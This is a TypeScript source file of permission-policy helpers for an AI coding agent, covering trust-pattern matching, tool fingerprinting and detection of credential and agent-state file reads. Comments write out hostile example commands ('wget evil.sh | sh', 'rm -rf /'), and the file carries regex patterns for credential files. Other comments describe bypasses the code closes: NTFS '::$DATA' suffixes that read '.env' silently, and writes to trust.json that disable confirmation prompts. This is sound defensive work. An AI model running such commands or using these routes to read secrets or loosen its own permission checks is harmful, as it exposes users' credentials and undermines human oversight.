/**
 * Pure helpers for permission policy evaluation — trust-pattern matching,
 * tool fingerprinting, and sensitive-read detection.
 *
 * Extracted from permission-policy.ts. No class state. The only I/O is the
 * sync realpath probe in {@link isInsideAgentStateRoot} (symlinked-root
 * containment); everything else is pure string work.
 */
import { realpathSync } from 'node:fs';
import * as path from 'node:path';
import type { Tool } from '../types/tool.js';
import { matchAny, matchAnyCommand } from '../utils/glob-match.js';
import { subjectForToolInput } from '../utils/tool-subject.js';
import { wstackGlobalRoot } from '../utils/wstack-paths.js';
import { hasCapability, ToolCapabilities } from './capabilities.js';
import { getInputString } from './yolo-risk.js';

/**
 * Match a computed subject against stored trust patterns.
 *
 * Exact string equality is checked FIRST, before glob compilation. Subjects are
 * glob-escaped at the source (`escapeGlobSubject` turns `* ? [ ]` into `\* \? \[
 * \]`), and a stored "always"-trust pattern is just a prior subject — so for an
 * identical command the pattern and the subject are byte-for-byte equal. The
 * glob matcher alone could not confirm that: `compileGlob` does not treat a
 * backslash as an escape outside character classes, so an escaped `\[`/`\]` is
 * parsed as a character-class delimiter and a command like `[ -f x ]` or
 * `grep "[0-9]"` never re-matched its own trust entry — re-prompting forever
 * even after the user chose "always" (#15). Exact equality is also strictly
 * tighter than a glob, so this never widens what a pattern authorizes; genuine
 * wildcard patterns (e.g. a user-authored `git *`) still fall through to glob.
 */
export function matchesTrust(patterns: string[], subject: string): boolean {
  return patterns.includes(subject) || matchAny(patterns, subject);
}

/**
 * Match a trust pattern against a shell command line, for ALLOW decisions only
 * (WS-047).
 *
 * `matchesTrust` compiles `*` to `[^/]*`, which crosses `;`, `&` and `|`. On a
 * path that is right; on a command it means a user who wrote `git *` also
 * authorized `git status; wget evil.sh | sh`. `matchAnyCommand` stops the
 * wildcard at shell separators, so the pattern authorizes what it appears to.
 *
 * DELIBERATELY NOT used for deny. This matcher is strictly narrower, and
 * narrowing a deny pattern un-blocks whatever falls outside it: a deny of
 * `git *` must keep matching `git status; rm -rf /`, because the user's intent
 * there is "no git-shaped command gets through", not "only well-formed ones".
 * Narrower is safer for allow and more dangerous for deny — hence two call
 * sites with two matchers rather than one shared helper that picks.
 *
 * Exact equality is kept first for the same reason as `matchesTrust`: a stored
 * "always" pattern is a prior subject, and glob-escaped brackets do not
 * round-trip through the compiler (#15).
 */
export function matchesCommandTrust(patterns: string[], subject: string): boolean {
  return patterns.includes(subject) || matchAnyCommand(patterns, subject);
}

/**
 * Every path-like string a write-capable tool input may carry. Shared by both
 * permission policies so a new write-target key recognized here protects the
 * leader and its subagents in the same edit (the same contract as
 * {@link isSensitiveReadCall}).
 */
export function fsWriteTargetPaths(input: unknown): string[] {
  const out: string[] = [];
  if (!input || typeof input !== 'object') return out;
  const obj = input as Record<string, unknown>;
  for (const key of [
    'path',
    'file_path',
    'file',
    'filePath',
    'files',
    'target',
    'targetPath',
    'out',
    'directory',
    'cwd',
    'template',
  ]) {
    const value = obj[key];
    if (typeof value === 'string') {
      if (value.length > 0) out.push(value);
    } else if (Array.isArray(value)) {
      for (const item of value) {
        if (typeof item === 'string' && item.length > 0) out.push(item);
      }
    }
  }
  return out;
}

/**
 * True when this tool's permission subject is a shell command line rather than
 * a path, url, or name — i.e. when the stricter wildcard rules apply.
 */
export function hasShellSubject(tool: Tool): boolean {
  return (
    tool.name === 'bash' ||
    tool.name === 'shell' ||
    tool.name === 'exec' ||
    hasCapability(tool, [
      ToolCapabilities.SHELL_ARBITRARY,
      ToolCapabilities.SHELL_RESTRICTED,
      ToolCapabilities.SHELL_EXEC,
    ])
  );
}

/**
 * Reason a persistent "always allow" cannot be recorded for this call, or
 * `undefined` when it can (WS-046).
 *
 * A stored trust pattern is only ever consulted as
 * `entry.allow && subject && matchesTrust(entry.allow, subject)`. When the tool
 * produces no subject, that condition can never be true — so `trust()` with the
 * fallback `pattern: tool.name` writes an entry that is dead on arrival.
 *
 * The user experience of that bug is the damaging part. They pick "always
 * allow", are asked again on the very next identical call, conclude the feature
 * is broken, and reach for the one thing that does work: a blanket
 * `{"exec": {"auto": true}}`. A silent no-op does not just fail to help — it
 * actively trains people into the widest possible grant.
 *
 * So the option is refused with a stated reason instead of accepted and
 * discarded. Exported so a UI can hide the choice rather than offer one that
 * cannot be honoured.
 */
export function alwaysAllowUnavailableReason(tool: Tool, input: unknown): string | undefined {
  const subject = subjectForToolInput(tool.name, input, tool.subjectKey, tool.subjectFields);
  if (subject !== undefined) return undefined;
  return (
    `"always allow" needs a subject to remember, and ${tool.name} calls do not carry one ` +
    `(no subjectKey, and no path/url/name input). Recording it would store a rule that can ` +
    `never match. Approve this call, or set a trust rule for ${tool.name} explicitly.`
  );
}

/**
 * Fingerprint of the tool fields a permission decision actually depends on
 * (WS-058).
 *
 * The eval cache was keyed on tool NAME plus subject, so a cached verdict
 * outlived the tool definition it was computed from. `ToolRegistry.wrap()`
 * replaces a tool in place and is reachable from the plugin API, so a tool
 * tightened to `permission: 'deny'` mid-session would keep being served the
 * `auto` decided under its previous definition. The cache check also runs
 * BEFORE the tool-default-deny branch, so nothing downstream re-checked.
 *
 * Including these fields in the key means a redefined tool misses the cache
 * and is re-evaluated, rather than inheriting a verdict that no longer
 * describes it. Capabilities are included because the dangerous-capability
 * branches read them; they are short, sorted lists. The tuple is
 * JSON-serialized so separators inside a field value (e.g. a `,` or `|`
 * in a capability string) cannot collide with the delimiters between
 * fields.
 */
export function permissionFingerprint(tool: Tool): string {
  const caps = [...(tool.capabilities ?? [])].sort();
  return JSON.stringify([
    tool.permission ?? '',
    tool.riskTier ?? '',
    tool.mutating ? 'm' : '',
    caps,
  ]);
}

export function shellCommandLineFromInput(input: unknown): string | undefined {
  const command =
    getInputString(input, 'command') ??
    getInputString(input, 'cmd') ??
    getInputString(input, 'script');
  if (!command) return undefined;
  if (!input || typeof input !== 'object') return command;
  const args = (input as Record<string, unknown>)['args'];
  if (!Array.isArray(args) || args.length === 0) return command;
  const renderedArgs = args
    .filter((arg): arg is string => typeof arg === 'string')
    .map((arg) => (/\s/.test(arg) ? `"${arg.replace(/"/g, '\\"')}"` : arg));
  return [command, ...renderedArgs].join(' ');
}

// ── Sensitive-read detection ─────────────────────────────────────────────

const SENSITIVE_READ_PATHS: RegExp[] = [
  /(?:^|[\\/])\.env(?:[.\w-]*)?$/i,
  /(?:^|[\\/])\.npmrc$/i,
  /(?:^|[\\/])\.pypirc$/i,
  /(?:^|[\\/])\.netrc$/i,
  /(?:^|[\\/])id_(?:rsa|dsa|ecdsa|ed25519)$/i,
  /(?:^|[\\/])\.aws[\\/]credentials$/i,
  /(?:^|[\\/])\.kube[\\/]config$/i,
  /(?:^|[\\/])(?:secrets?|tokens?|credentials?|private[_-]?keys?)$/i,
  /(?:^|[\\/])[^\\/]*(?:secret|token|credential|private[_-]?key)[^\\/]*(?:\.json|\.ya?ml|\.toml|\.ini|\.txt|\.env|\.properties|\.key|\.pem)$/i,
];

const SHELL_READ_VERBS = new Set([
  'cat',
  'type',
  'get-content',
  'gc',
  'more',
  'less',
  'head',
  'tail',
  'grep',
  'rg',
  'sed',
  'awk',
  'findstr',
  'select-string',
  'strings',
  'cp',
  'copy',
  'scp',
]);

function stripShellQuotes(value: string): string {
  return value.replace(/^['"]|['"]$/g, '');
}

/**
 * Files under the wstack global root that constitute WrongStack's own trusted
 * state. Reading or writing one of these is qualitatively different from
 * touching the memory/session/skill files that share the directory:
 *
 * - `config.json` / `config.local.json` — merged as a **fully trusted** config
 *   layer (unlike in-project config, which is stripped). `hooks`, `mcpServers`
 *   and `plugins` survive here and become code execution at next boot.
 * - `trust.json` — the persisted permission allow/deny globs. A write here can
 *   disable every future confirmation prompt.
 * - `auth.json` — HQ browser/client tokens.
 * - `.key` — the AES-256-GCM secret-vault key.
 *
 * Deliberately basename-scoped rather than directory-scoped: `~/.wrongstack`
 * also holds `memory.md`, `sessions/`, and `skills/`, which the agent reads
 * constantly. Treating the whole tree as sensitive would make the prompt
 * meaningless through sheer volume.
 */
const AGENT_STATE_SENSITIVE_BASENAMES =
  /^(?:config\.json|config\.local\.json|trust\.json|auth\.json|\.key)$/i;

/** Undo `escapeGlobSubject`'s backslash escapes so a subject compares as a path. */
function unescapeGlobSubject(value: string): string {
  return value.replace(/\\([*?[\]])/g, '$1');
}

/** Normalize a path for prefix comparison: forward slashes, case-folded on Windows. */
/**
 * Drop an NTFS alternate-data-stream suffix from the final path segment.
 *
 * On Windows `fs` resolves `.env::$DATA` to the *same file* as `.env` — reading
 * it returns the contents, and writing through `config.json::$DATA` overwrites
 * `config.json`. Every pattern in {@link SENSITIVE_READ_PATHS} and
 * {@link AGENT_STATE_SENSITIVE_BASENAMES} is `$`-anchored, so the suffix made
 * them all miss: `read` is `permission: 'auto'`, which turned
 * `{"path": ".env::$DATA"}` into a silent credential read, and it likewise
 * slipped past the YOLO agent-state write guard.
 *
 * Only the last segment is trimmed, and only past the first colon in it, so a
 * `C:/...` drive letter (its own leading segment) is untouched.
 */
function stripAdsSuffix(forwardSlashPath: string): string {
  const cut = forwardSlashPath.lastIndexOf('/');
  const dir = cut === -1 ? '' : forwardSlashPath.slice(0, cut + 1);
  const base = cut === -1 ? forwardSlashPath : forwardSlashPath.slice(cut + 1);
  const colon = base.indexOf(':');
  // `cut === -1 && colon === 1` is a bare drive spec like `C:` — leave it.
  if (colon === -1 || (cut === -1 && colon === 1 && base.length <= 2)) return forwardSlashPath;
  return dir + base.slice(0, colon);
}

function normalizeForCompare(value: string): string {
  const forward = stripAdsSuffix(
    unescapeGlobSubject(value).replace(/\\/g, '/').replace(/\/+$/, ''),
  );
  return process.platform === 'win32' ? forward.toLowerCase() : forward;
}

/**
 * Realpath of `p`'s deepest existing ancestor with the not-yet-created tail
 * re-joined (a write target may not exist yet), or `p` itself when nothing
 * resolves (e.g. the root does not exist yet on first boot).
 */
function realpathOfNearestExisting(p: string): string {
  let probe = p;
  const tail: string[] = [];
  for (;;) {
    try {
      return tail.length === 0 ? realpathSync(probe) : path.join(realpathSync(probe), ...tail);
    } catch {
      const parent = path.dirname(probe);
      if (parent === probe) return p;
      tail.unshift(path.basename(probe));
      probe = parent;
    }
  }
}

/**
 * Realpaths of the agent-state root, keyed by the root's lexical form. The
 * root is stable for a given `WRONGSTACK_HOME`/home value, so the sync
 * realpath probe runs once per distinct root rather than per evaluation.
 */
const agentStateRootRealCache = new Map<string, string>();

/**
 * True when `absPath` is the wstack global root (`~/.wrongstack`, or
 * `WRONGSTACK_HOME`) or lives inside it.
 *
 * Callers use this to refuse *silent* access to WrongStack's own state. It is
 * not a containment check — the file tools deliberately allow this root so the
 * agent can manage its memory and sessions. What it gates is whether that
 * access may happen without the user seeing it.
 *
 * The comparison is realpath-aware on both sides: `~/.wrongstack` may itself
 * be a symlink, and the file tools canonicalize subjects to realpaths
 * (`safeResolveReal`, WS-048), so a purely lexical check misses every state
 * file under a symlinked root. The lexical pass stays first — it is free and
 * correct for the default layout — and the realpath pass only runs when it
 * fails, comparing the root (cached) against the subject's nearest existing
 * ancestor.
 */
export function isInsideAgentStateRoot(absPath: string): boolean {
  const lexicalRoot = normalizeForCompare(path.resolve(wstackGlobalRoot()));
  if (!lexicalRoot) return false;
  const target = normalizeForCompare(absPath);
  if (target === lexicalRoot || target.startsWith(`${lexicalRoot}/`)) return true;

  let realRoot = agentStateRootRealCache.get(lexicalRoot);
  if (realRoot === undefined) {
    realRoot = normalizeForCompare(realpathOfNearestExisting(path.resolve(wstackGlobalRoot())));
    agentStateRootRealCache.set(lexicalRoot, realRoot);
  }
  if (!realRoot || realRoot === lexicalRoot) return false;
  const realTarget = normalizeForCompare(realpathOfNearestExisting(absPath));
  return realTarget === realRoot || realTarget.startsWith(`${realRoot}/`);
}

/**
 * True when writing `absPath` must not be silently auto-approved, because the
 * file is part of WrongStack's own trusted state rather than project content.
 */
export function isProtectedAgentStatePath(absPath: string): boolean {
  if (!isInsideAgentStateRoot(absPath)) return false;
  return AGENT_STATE_SENSITIVE_BASENAMES.test(path.basename(normalizeForCompare(absPath)));
}

function pathLooksSensitive(rawPath: string): boolean {
  // ADS strip before matching — see stripAdsSuffix. `.env::$DATA` reads `.env`,
  // but every pattern below is `$`-anchored and would miss it.
  const normalized = stripAdsSuffix(stripShellQuotes(rawPath).replace(/\\/g, '/'));
  if (SENSITIVE_READ_PATHS.some((pattern) => pattern.test(normalized))) return true;
  // `config.json` alone is far too common to put in SENSITIVE_READ_PATHS — it
  // would fire on nearly every project. Anchoring it to the global root keeps
  // the match precise.
  return isProtectedAgentStatePath(normalized);
}

export function inputPathLooksSensitive(input: unknown): boolean {
  if (!input || typeof input !== 'object') return false;
  const obj = input as Record<string, unknown>;
  for (const key of ['path', 'file', 'file_path', 'filePath', 'target', 'targetPath']) {
    const value = obj[key];
    if (typeof value === 'string' && pathLooksSensitive(value)) return true;
  }
  return false;
}

export function shellCommandReadsSensitivePath(command: string): boolean {
  const tokens =
    command.match(/"[^"]*"|'[^']*'|\S+/g)?.map((token) => stripShellQuotes(token).toLowerCase()) ??
    [];
  for (let i = 0; i < tokens.length; i++) {
    const token = tokens[i];
    if (!token) continue;
    if (!SHELL_READ_VERBS.has(token)) continue;
    const rest = tokens.slice(i + 1);
    if (rest.some((arg) => pathLooksSensitive(arg))) return true;
  }
  return false;
}

/**
 * True when `tool` + `input` amount to reading a credential-bearing path.
 *
 * Shared by both permission policies. It lived as a private method on
 * `DefaultPermissionPolicy`, so `AutoApprovePermissionPolicy` — the policy
 * subagents run under — had no way to apply it, and a delegated read of
 * `~/.aws/credentials` was auto-approved where the leader would have prompted.
 * Keeping one implementation here means widening the sensitive-path list
 * protects the leader and its subagents in the same edit.
 */
export function isSensitiveReadCall(tool: Tool, input: unknown): boolean {
  const isReadTool =
    hasCapability(tool, ToolCapabilities.FS_READ) ||
    tool.name === 'read' ||
    tool.name === 'grep' ||
    tool.name === 'glob' ||
    tool.name === 'tree';
  if (isReadTool && inputPathLooksSensitive(input)) return true;

  const hasShellCap = hasCapability(tool, [
    ToolCapabilities.SHELL_ARBITRARY,
    ToolCapabilities.SHELL_RESTRICTED,
    ToolCapabilities.SHELL_EXEC,
  ]);
  if (!hasShellCap && tool.name !== 'bash' && tool.name !== 'shell' && tool.name !== 'exec') {
    return false;
  }
  const command = shellCommandLineFromInput(input);
  return command ? shellCommandReadsSensitivePath(command) : false;
}
